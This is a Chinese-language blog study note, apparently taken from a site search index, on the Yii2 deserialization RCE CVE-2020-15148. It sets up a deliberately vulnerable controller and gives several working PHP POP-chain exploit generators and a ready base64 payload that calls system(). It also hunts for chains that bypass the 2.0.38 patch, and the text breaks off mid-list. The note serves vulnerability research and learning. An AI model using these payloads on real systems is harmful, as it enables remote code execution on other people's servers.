<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Yii2 反序列化（CVE-2020-15148）学习笔记</title>
      <link href="/2020/09/22/Yii2unserialize/"/>
      <url>/2020/09/22/Yii2unserialize/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>HW期间爆出的Yii2漏洞，分别在9月19日进行复现，9月22日研究新的POC，并且尝试自己挖掘POP链。</p><p><strong>影响范围</strong></p><ul><li>Yii2 &lt; 2.0.38</li></ul><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><h2 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h2><p>我是github下载的源码，利用MAMP构建。</p><p>选择一个存在漏洞的版本：<a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>解压到Web目录，然后修改一下配置文件。<br><code>/config/web.php</code>:给<code>cookieValidationKey</code>字段设置一个值（随便什么值）作为<code>yii\web\Request::cookieValidationKey</code>的加密值，不设置会报错如下图所示：</p><p><img src="http://image.v0w.top/Blog/2020-09-22-171609.jpg"></p><p>接着添加一个存在漏洞的Action:<code>/controllers/TestController.php</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $name = Yii::$app-&gt;request-&gt;get(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode($name));    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试成功，完成环境搭建。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-194105.jpg"></p><h2 id="1-2-漏洞分析与第一条POP链"><a href="#1-2-漏洞分析与第一条POP链" class="headerlink" title="1.2 漏洞分析与第一条POP链"></a>1.2 漏洞分析与第一条POP链</h2><p>漏洞入口点定位在：<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php :line79-98</code></p><p><img src="http://image.v0w.top/Blog/2020-09-22-203016.jpg"></p><p>对象销毁的时候，会调用<code>reset()</code>方法，函数中的<code>$this-&gt;_dataReader</code>变量可控。而这个变量调用了<code>close()</code>函数，这个函数在类中不存在，因此可以触发<code>__call</code>魔术方法，接下来就是要寻找可利用的点。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-205420.jpg"></p><p>通过搜索功能可以很容易的找到很多利用点，<strong>米斯特安全团队</strong>在复现时使用的是<code>Faker\Generator类/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">$formatter, $arguments = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $attributes</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $formatter</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Callable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params">$formatter</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这个类的<code>__call()</code>方法会调用<code>format()</code>方法，</p><p><code>format()</code>方法通过<code>getFormatter($formatter)</code>方法获取参数，传入<code>call_user_func_array</code>。</p><p>因为<code>this-&gt;$formatters</code>我们可控，可以继续去调用任意类任意方法。</p><p>但是<code>$arguments</code>是从<code>yii\db\BatchQueryResult::reset()</code>里传过来的，我们<strong>不可控</strong>(为空)，所以我们只能<strong>不带参数</strong>地去调用别的类中的方法。</p><p>目前<code>$formatter=&#39;close&#39;</code>,<code>$arguments</code>为空，<code>this-&gt;formatters</code>可控。</p><p>那我们会想因为需要不带参数调用其他类的方法，那么这时需要的方法一定要满足两个条件：</p><ol><li>方法所需的参数只能是其自己类中存在的（即参数：<code>$this-&gt;args</code>）</li><li>方法需要有命令执行功能</li></ol><p><strong>米斯特团队</strong>是通过<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>的正则来查找到两个方法比较合适：</p><ol><li><code>yii\rest\CreateAction::run()</code></li><li><code>\yii\rest\IndexAction::run()</code></li></ol><p><img src="http://image.v0w.top/Blog/2020-09-22-232801.jpg"></p><p><code>/vendor/yiisoft/yii2/rest/IndexAction.php::run()</code>中的<code>$this-&gt;checkAccess, $this-&gt;id</code>都是可控的。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-233803.jpg"></p><p><code>/vendor/yiisoft/yii2/rest/CreateAction.php::run()</code>中的<code>$this-&gt;checkAccess, $this-&gt;id</code>都是可控的。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-233930.jpg"></p><p>通过这两个函数都可以执行。</p><p>于是构造了完整的POP链：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP1:</span><br><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p>完整的POP链有了之后，EXP的编写就相对简单了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//EXP1:BatchQueryResult -&gt;...-&gt; __call()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//reset方法里又调用了close()方法:$this-&gt;_dataReader-&gt;close();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line"> <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-23-142928.jpg"></p><h2 id="1-3-漏洞修复"><a href="#1-3-漏洞修复" class="headerlink" title="1.3 漏洞修复"></a>1.3 漏洞修复</h2><p>Yii 2.0.38版本修复该漏洞，那么他是怎么修复的呢？</p><p><img src="http://image.v0w.top/Blog/2020-09-23-143418.png" alt="github compare"></p><p>可以看到就只是在<code>yii\db\BatchQueryResult</code>类里添加了一个<code>__wakeup</code>方法，</p><p><code>__wakeup</code>方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当<code>BatchQueryResult</code>类被反序列化时就直接报错，避免反序列化的发生，也就避免了该漏洞产生。</p><h1 id="0x02-通过不同的思路构造新的POP链"><a href="#0x02-通过不同的思路构造新的POP链" class="headerlink" title="0x02 通过不同的思路构造新的POP链"></a>0x02 通过不同的思路构造新的POP链</h1><p>我们除了可以通过<code>__call</code>方法，因为调用<code>close()</code>，我们还可以通过存在危险函数的<code>close()</code>方法的类，来进行RCE。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-203016.jpg"></p><p>全局查询<code>close函数</code>：<code>function close\(\)</code></p><p><img src="http://image.v0w.top/Blog/2020-09-23-221606.jpg"></p><p>看了一圈，发现<code>\yii\web\DbSession::close</code>存在危险函数且参数可控。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web/DbSession.php::line146</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;getIsActive()) &#123;</span><br><span class="line">            <span class="comment">// prepare writeCallback fields before session closes</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;fields = <span class="keyword">$this</span>-&gt;composeFields();</span><br><span class="line">            YII_DEBUG ? session_write_close() : @session_write_close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>$this-&gt;composeFields()</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web/MultiFieldSession.php::line 96</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">composeFields</span>(<span class="params">$id = <span class="literal">null</span>, $data = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fields = <span class="keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="keyword">$this</span>-&gt;writeCallback, <span class="keyword">$this</span>) : [];</span><br><span class="line">        <span class="keyword">if</span> ($id !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $fields[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($data !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $fields[<span class="string">&#x27;data&#x27;</span>] = $data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $fields;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>call_user_func</code>函数中的<code>$callback</code>参数支持已实例化的对象作为数组传递：</p><p><a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p><blockquote><p><strong>Callback / Callable 类型</strong></p><p>PHP是将函数以<a href="https://www.php.net/manual/zh/language.types.string.php">string</a>形式传递的。 可以使用任何内置或用户自定义函数，但除了语言结构例如：<a href="https://www.php.net/manual/zh/function.array.php">array()</a>，<a href="https://www.php.net/manual/zh/function.echo.php">echo</a>，<a href="https://www.php.net/manual/zh/function.empty.php">empty()</a>，<a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>，<a href="https://www.php.net/manual/zh/function.exit.php">exit()</a>，<a href="https://www.php.net/manual/zh/function.isset.php">isset()</a>，<a href="https://www.php.net/manual/zh/function.list.php">list()</a>，<a href="https://www.php.net/manual/zh/function.print.php">print</a> 或 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a>。</p><p>一个已实例化的 <a href="https://www.php.net/manual/zh/language.types.object.php">object</a> 的方法被作为 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 传递，下标 0 包含该 <a href="https://www.php.net/manual/zh/language.types.object.php">object</a>，下标 1 包含方法名。 在同一个类里可以访问 protected 和 private 方法。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP2：</span><br><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\web\DbSession::close -&gt; MultiFieldSession::composeFields -&gt; call_user_func($this-&gt;writeCallback, $this)</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP2</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP2: BatchQueryResult -&gt; DbSession::close -&gt; call_user_func -&gt; IndexAction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">payload</span> = <span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $writeCallback;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-新版本2-0-38下的反序列化"><a href="#0x03-新版本2-0-38下的反序列化" class="headerlink" title="0x03 新版本2.0.38下的反序列化"></a>0x03 新版本2.0.38下的反序列化</h1><p>从上面的修复方案不难看出，新版本2.0.38修复了<code>BatchQueryResult</code>类的反序列化问题，那么是否存在其他的类可以反序列化呢？于是开始下面的尝试。</p><p>首先我们需要明确思路：</p><ul><li><strong>通过不同的触发点来绕过新版本的Patch。</strong>因为新版本的patch只是打在了<code>BatchQueryResult</code>这个触发点的类中，如果存在其他的类有触发点，那么问题就可以迎刃而解。</li></ul><p>首先查找一下比较常见的反序列化触发点：<code>function __destruct()|__wakeup()</code></p><p><img src="http://image.v0w.top/Blog/2020-09-23-151911.jpg"></p><p>也不是很多，可以挨个看一下，应该会有一些发现的。我将全部的都看了一遍，然后把可以利用的类，构造EXP。不可以利用的类，说明原因。</p><h2 id="3-1-EXP3："><a href="#3-1-EXP3：" class="headerlink" title="3.1 EXP3："></a>3.1 EXP3：</h2><p><code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> $process) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">            <span class="keyword">if</span> (!$process-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());</span><br><span class="line">            $process-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>析构的时候，调用<code>stopProcess()</code>，而函数中的<code>this-&gt;processes</code>可控，也就意味着<code>$process</code>可控。而因为<code>$process</code>调用<code>isRunning()</code>函数进行判断，这个不在类中，会触发<code>__call()</code>方法。</p><p>至于后面的嘛，就可以接上第一条利用链POP1的<code>__call()</code>方法开头的后半段，完成一个新的POP链：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP3:</span><br><span class="line">\Codeception\Extension\RunProcess::__destruct()-&gt;stopProcess()-&gt;$process-&gt;isRunning()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP3</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP3: RunProcess -&gt; ... -&gt; __call()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-23-163935.jpg"></p><h2 id="3-2-EXP4"><a href="#3-2-EXP4" class="headerlink" title="3.2 EXP4"></a>3.2 EXP4</h2><p><code>\Swift_KeyCache_DiskKeyCache::__destruct</code>调用<code>clearAll</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> $nsKey =&gt; $null) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearAll($nsKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>clearAll()</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearAll</span>(<span class="params">$nsKey</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($nsKey, <span class="keyword">$this</span>-&gt;keys)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys[$nsKey] <span class="keyword">as</span> $itemKey =&gt; $null) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearKey($nsKey, $itemKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey)) &#123;</span><br><span class="line">            rmdir(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keys[$nsKey]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>clearKey</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearKey</span>(<span class="params">$nsKey, $itemKey</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasKey($nsKey, $itemKey)) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;freeHandle($nsKey, $itemKey);</span><br><span class="line">           unlink(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey.<span class="string">&#x27;/&#x27;</span>.$itemKey);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>unlink</code>用到了拼接字符串，而<code>this-&gt;path</code>可控，所以就调用<code>__toString()</code>方法：</p><blockquote><p><code>__toString</code> 当一个对象被当做字符串使用时被调用</p></blockquote><p>接下来需要找到可以利用的<code>__toString()</code>魔术方法来触发后续操作。</p><p>全局搜索一下<code>__toString()</code>方法：<code>function __toString\(\)</code></p><p>可以发现不少的方法，接下来最好找一些<strong>调用其他类函数</strong>的<code>__toString</code></p><p>比如我找了几个：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\Codeception\Util\XmlBuilder::__toString -&gt; \DOMDocument::saveXML 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span 